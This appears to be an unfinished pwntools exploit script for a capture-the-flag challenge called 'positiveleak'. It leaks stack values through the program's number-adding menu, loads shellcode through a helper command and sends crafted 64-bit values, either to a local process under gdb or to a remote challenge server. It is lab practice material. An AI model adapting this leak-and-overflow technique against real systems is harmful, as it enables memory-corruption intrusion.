from pwn import *
import time
import subprocess
import sys
import warnings
import re

def print_red(str):
	print("\033[91m" + str + "\033[0m")

def genbin(binary_name):
	command = f"genbin ~/challenges/playroom/shellcodes/{binary_name}"
	try:
		return bytes.fromhex(subprocess.check_output(command, shell=True, universal_newlines=True))
	except (subprocess.CalledProcessError, ValueError) as e:
		print(f"An exception occurred: {e}")
		exit(-1)


# takes an integer as input and displays the value on the stack at index i
# it asusmes you are in menu once invoked
def get_leak(i):
    r.recvrepeat(timeout=0.2)
    time.sleep(0.2)
    r.sendline(b"0")            #add numbers
    time.sleep(0.2)
    r.sendline(str(i).encode()) # number of numbers I wanna add
    time.sleep(0.2)
    for i in range(i+1):        # adding them
        r.sendline(b"0")
        time.sleep(0.2)
    r.sendline(b"1")            # display the sum
    time.sleep(0.2)
    r.recvlines(5)
    r.recvuntil(b"> ")
    r.recvlines(i)
    value = hex(int(r.recvlineS().strip()))
    print(value)

context.terminal = ['tmux', 'splitw', '-h']
#context.log_level = "error"
warnings.filterwarnings("ignore", category=BytesWarning)


# breakpoints
add_numbers = "add_numbers:167"


if args["REMOTE"]:
	r = remote("bin.offdef.jinblack.it", 3003)
else:
    r = process("./positiveleak")
    gdb.attach(r, f"""
    b {add_numbers}
    unset env
    set disable-randomization off
    c
    """)

input("wait")
r.sendline(b"0") # add numbers
time.sleep(0.2)
r.sendline(b"11")
time.sleep(0.2)
for i in range(11):
    r.sendline(p64(i)+b"\x00")
    time.sleep(0.2)

r.interactive()
